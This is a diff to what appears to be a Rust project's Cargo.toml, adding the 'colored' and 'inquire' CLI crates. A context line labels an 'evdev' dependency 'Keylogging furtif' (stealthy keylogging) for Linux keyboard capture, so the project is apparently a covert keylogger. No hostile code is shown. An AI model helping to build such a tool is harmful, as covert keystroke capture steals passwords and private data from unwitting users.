@@ -6,6 +6,8 @@ edition = "2021"
 [dependencies]
 # Interface CLI
 clap = { version = "4.4", features = ["derive"] }
+colored = "2.0"
+inquire = "0.6"
 
 # Keylogging furtif
 evdev = "0.12"   # Linux (capture clavier via /dev/input/eventX)
